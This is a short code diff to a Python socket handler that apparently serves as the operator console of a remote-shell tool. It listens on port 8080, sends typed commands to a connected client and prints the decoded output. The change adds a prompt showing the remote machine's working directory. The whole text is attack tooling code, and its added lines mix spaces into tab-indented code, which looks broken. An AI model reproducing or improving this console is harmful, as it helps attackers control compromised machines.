@@ -4,7 +4,9 @@ class Handler:
 	def __init__(self, bind, port):
 		self.bind = bind
 		self.port = port
-
+                
+                self.cwd = "STELF CONNECTED"
+    
 		self.server_sock = socket.socket()
 		self.server_sock.bind((self.bind, self.port))
 		
@@ -18,12 +20,13 @@ class Handler:
 		self.server_sock.listen(5)
 		self.client_socket, _ = self.server_sock.accept()
 		while True:
-			user_input = raw_input()
+			user_input = raw_input(self.cwd + " >> ")
 			self.send_cmd(user_input)
 			data = self.client_socket.recv(4096)
 			data_package = json.loads(data)
 			for key in data_package:
 				data_package[key] = base64.b64decode(data_package[key])
+			self.cwd = data_package["cwd"]
 			sys.stdout.write(data_package["data"])
 
 handler = Handler("0.0.0.0", 8080)
